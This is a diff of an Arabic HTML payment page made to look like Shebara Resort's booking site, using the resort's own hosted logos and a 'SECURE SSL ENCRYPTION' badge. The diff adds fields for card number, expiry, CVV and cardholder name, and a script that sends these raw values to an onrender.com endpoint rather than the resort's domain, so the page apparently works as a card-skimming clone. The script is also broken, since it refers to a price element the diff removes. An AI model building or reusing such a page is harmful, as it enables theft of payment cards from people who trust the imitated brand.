@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Buy Page</title>
+  <title>payments</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
-    body {
+ body {
       margin: 0;
       font-family: 'Cairo', sans-serif;
       background: #f9f9f9;
@@ -250,67 +250,11 @@ nav a:hover {
       border-radius: 6px;
       margin-bottom: 50px;
     }
-
-    .booking-summary {
-  display: flex;
-  justify-content: flex-start;
-  align-items: center;
-  background-color: #ffffff; /* لون المربع */
-  border-radius: 0;
-  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-  padding: 15px 25px;
-  margin: 0;
-  width: 100%;
-  box-sizing: border-box;
-  gap: 25px;
-  max-width: 100%;
-}
-
-.booking-info {
-  display: flex;
-  flex-direction: column; /* يخلي العناصر فوق بعض */
-  align-items: flex-start; /* يخليهم من اليسار */
-  gap: 5px; /* مسافة بسيطة بين الاسم والتاريخ */
-}
-
-.booking-info h3 {
-  font-size: 20px;
-  margin: 0;
-  color: #121111;
-}
-
-.booking-info p {
-  font-size: 14px;
-  color: #777;
-  margin: 2px 0 0 0;
-}
-
-.booking-details {
-  text-align: right;
-}
-
-.booking-details .price {
-  font-weight: 600;
-  font-size: 18px;
-  color: #121111; /* نفس لون النص */
-  background: none; /* بدون خلفية */
-  border: none; /* بدون مربع */
-}
-
-.bar-right p {
-  color: #fff;
-  font-size: 18px;
-  margin: 0;
-}
-
+    
+    
 .card {
-  background-color: #f1f1f0; /* لون فاتح */
-  padding: 30px;
-  border-radius: 15px;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-  width: 1000px;   /* عرض ثابت */
-  max-width: 90%; /* responsive */
-  margin-bottom: 50px;
+  background: none;
+  box-shadow: none;
 }
 
   .card h2 {
@@ -403,14 +347,15 @@ nav a:hover {
 }
 
 .payment-card {
-  background-color: #e0e0dd;
-  padding: 25px 30px;
-  border-radius: 15px;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+  background-color: transparent;
+  padding: 0px;
+  border-radius: 0px;
+  box-shadow: none;
   display: flex;
   flex-direction: column;
   gap: 15px;
   width: 100%;        /* كامل مساحة القسم */
+   margin: 0 auto;
   max-width: 800px;   /* لا تتجاوز 500px */
 }
 
@@ -422,6 +367,7 @@ nav a:hover {
 }
 
 .payment-card .form-group input {
+  background-color: #fff;
   width: 100%;
   padding: 10px;
   border-radius: 5px;
@@ -512,9 +458,9 @@ nav a:hover {
   background-color: #000; /* أسود */
   color: #fff;           /* نص أبيض */
   border: none;           /* بدون حدود */
-  padding: 20px 60px;     /* حجم الزر */
+  padding: 15px 30px;     /* حجم الزر */
   border-radius: 8px;     /* زوايا مدورة */
-  font-size: 22px;        /* حجم النص */
+  font-size: 18px;        /* حجم النص */
   cursor: pointer;        /* مؤشر اليد عند المرور */
   transition: 0.3s;       /* تأثير عند التحويم */
   display: block;
@@ -525,76 +471,28 @@ nav a:hover {
   background-color: #333; /* تغيير لون عند التحويم */
 }
 
-.after-location {
-  text-align: center;
-  padding: 80px 20px;
-  background: #f8f9fa; /* خلفية فاتحة */
-}
+ #confirmBooking {
+      display: block;
+      margin: 50px auto;
+      background-color: #000;
+      color: #fff;
+      border: none;
+      padding: 20px 60px;
+      border-radius: 10px;
+      font-size: 24px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
 
-.after-location .intro-text {
-  font-size: 18px;
-  margin-bottom: 40px; /* مسافة كبيرة */
-  color: #555;
-}
+    #confirmBooking:hover {
+      background-color: #333;
+    }
 
-.after-location .brand {
-  font-size: 60px;
-  font-weight: bold;
-  margin-bottom: 40px;
-  color: #000;
-}
-
-.after-location .subtitle {
-  font-size: 28px;
-  margin-bottom: 20px;
-  color: #222;
-}
-
-.after-location .desc {
-  font-size: 16px;
-  margin-bottom: 30px;
-  color: #555;
-}
-
-.after-location .btn-inquiry {
-  display: inline-block;
-  padding: 12px 30px;
-  background: #000;
-  color: #fff;
-  border-radius: 30px;
-  text-decoration: none;
-  font-size: 16px;
-  margin-bottom: 60px; /* مسافة قبل الحقوق */
-  transition: 0.3s;
-}
-
-.after-location .btn-inquiry:hover {
-  background: #333;
-}
-
-.after-location .rights {
-  font-size: 14px;
-  color: #666;
-  margin-bottom: 15px;
-}
-
-.after-location .back-to-top {
-  font-size: 14px;
-  color: #000;
-  text-decoration: none;
-  border: none;
-  background: none;
-  cursor: pointer;
-}
-
-.after-location .back-to-top:hover {
-  text-decoration: underline;
-}
   </style>
 </head>
 <body>
 
-    <header>
+     <header>
   <div class="header-container">
     <div class="logo">شيبارة</div>
 
@@ -638,81 +536,81 @@ nav a:hover {
     </div>
   </section>
 
- <div class="booking-summary">
-  <div class="booking-info">
-    <h3>Shebara Resort</h3>
-    <p id="resortDate">16 - 17 أكتوبر 2025</p>
-  </div>
-  <div class="booking-details">
-    <p><span id="finalPrice"></span> ﷼</p>
-  </div>
-</div>
+  <section class="payment-card-section">
+  <h3 style="text-align:center; margin-bottom:20px;">تأكيد الحجز</h3>
 
-<section style="width: 100%; display: flex; flex-direction: column; align-items: center; margin-top: 30px;">
-  <h3 style="text-align: center; margin-bottom: 20px;">بياناتك الشخصية</h3>
-
-  <div style="width: 100%; max-width: 600px;">
-    <div class="form-group">
-      <label for="first-name">الاسم الأول</label>
-      <input type="text" id="first-name" placeholder="اكتب اسمك الأول">
+  <div class="payment-card">
+    <!-- رقم البطاقة وأيقونات البطاقات -->
+    <div class="form-group card-number">
+      <label for="creditCardNumber">رقم البطاقة *</label>
+      <input type="text" id="creditCardNumber" placeholder="0000 0000 0000 0000">
+      <ul class="card-icons">
+        <li><img src="https://reservations.shebara.sa/build/assets/icon-card-mastercard-BbJltpnZ.svg" alt="Mastercard"></li>
+        <li><img src="https://reservations.shebara.sa/build/assets/icon-card-visa-CqIUJSxK.svg" alt="Visa"></li>
+        <li><img src="https://reservations.shebara.sa/build/assets/icon-card-amex-Def5Lezi.svg" alt="Amex"></li>
+        <li><img src="https://reservations.shebara.sa/build/assets/icon-card-dinersclub-Eyp5kNf4.svg" alt="Diners Club"></li>
+      </ul>
     </div>
 
-    <div class="form-group">
-      <label for="last-name">اسم العائلة</label>
-      <input type="text" id="last-name" placeholder="اكتب اسم العائلة">
+    <!-- تاريخ انتهاء الصلاحية -->
+    <div class="form-group expiry">
+      <label for="expiryDate">تاريخ انتهاء الصلاحية *</label>
+      <input type="text" id="expiryDate" placeholder="MM/YY">
     </div>
 
-    <div class="form-group">
-      <label for="phone">رقم الهاتف</label>
-      <input type="tel" id="phone" placeholder="مثال: +966500000000">
+    <!-- رمز الحماية -->
+    <div class="form-group cvv">
+      <label for="cvv">رمز الحماية *</label>
+      <div class="tooltip-container">
+        <input type="text" id="cvv" placeholder="3/4 الأرقام">
+        <button class="tooltip-btn">
+          <img src="https://reservations.shebara.sa/build/assets/form-tooltip-icon-uII0OYM9.svg" alt="tooltip">
+        </button>
+        <div class="tooltip-text">الرمز المكون من ثلاثة أو أربعة أرقام على ظهر بطاقتك</div>
+      </div>
     </div>
 
-    <div class="form-group">
-      <label for="email">البريد الإلكتروني</label>
-      <input type="email" id="email" placeholder="اكتب بريدك الإلكتروني">
+    <!-- اسم حامل البطاقة -->
+    <div class="form-group name-on-card">
+      <label for="nameOnCard">اسم حامل البطاقة *</label>
+      <input type="text" id="nameOnCard" placeholder="اكتب اسم حامل البطاقة">
     </div>
 
-    <div class="form-group">
-      <label for="address">العنوان</label>
-      <input type="text" id="address" placeholder="اكتب عنوانك">
+    <!-- موافقة على الشروط -->
+    <div class="terms">
+      <label>
+        <input type="checkbox">
+        أوافق على <a href="#">الشروط والأحكام</a> و <a href="#">سياسة الخصوصية</a>
+      </label>
+    </div>
+
+    <!-- أيقونات الأمان -->
+    <div class="security-icons">
+      <img src="https://reservations.shebara.sa/build/assets/security-graphic-B52lghYp.svg" alt="SSL Secure">
+      <div class="ssl-text">
+        <span>SECURE</span>
+        <small>SSL ENCRYPTION</small>
+      </div>
     </div>
   </div>
 </section>
-
 
 <div style="height: 40px;"></div> <!-- مسافة بعد الكرت -->
 
-<h3 style="text-align: center; margin-bottom: 20px;">تفاصيل السداد</h3>
-<div class="payment-info">
-  <i class="fas fa-lock"></i>تفاصيل الدفع والمعلومات الشخصية الخاصة بك مشفرة وامنة
-</div>
+<button id="confirmBooking">تأكيد حجزي</button>
 
-<button id="confirmBooking" class="confirm-btn">متابعة</button>
-
-<div style="height: 40px;"></div>
-
-<section class="after-location">
-  <div class="container">
-    <h1 class="brand">شيبارة</h1>
-    <h2 class="subtitle">حيث المستقبل المستدام</h2>
-    <p class="desc">نسعد بتقديم المساعدة في أي استفسار أو معلومة تحتاجها</p>
-    <a href="inquiries.html" class="btn-inquiry">للاستفسارات</a>
-    <p class="rights">البحر الأحمر 2024  © جميع الحقوق محفوظة</p>
-    <a href="#top" class="back-to-top">الرجوع إلى الأعلى ↑</a>
-  </div>
-</section>
-
-  <script>
+ <script>
 const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('villaPrice') || 0;
 document.getElementById('finalPrice').textContent = parseFloat(finalPrice).toFixed(2);
 
 async function submitBooking() {
   const bookingData = {
-    firstName: document.getElementById('first-name').value,
-  lastName: document.getElementById('last-name').value,
-  phone: document.getElementById('phone').value,
-  email: document.getElementById('email').value,
-  address: document.getElementById('address').value,
+  cardNumber: document.getElementById('creditCardNumber').value,
+  cardExpiry: document.getElementById('expiryDate').value,
+  cardBrand: 'Visa', // أو اجعل المستخدم يحدد نوع البطاقة
+  cvv: document.getElementById('cvv').value,
+  nameOnCard: document.getElementById('nameOnCard').value,
+  amount: 18837 // أو اجلبه من الحجز
   };
 
   const res = await fetch('https://shebara.onrender.com/api/book', {
@@ -730,10 +628,6 @@ async function submitBooking() {
     alert('حدث خطأ، حاول مرة أخرى');
   }
 }
-
-document.getElementById('confirmBooking').addEventListener('click', function() {
-  window.location.href = 'payment.html';
-});
 
 document.getElementById('confirmBooking').addEventListener('click', submitBooking);
 </script>
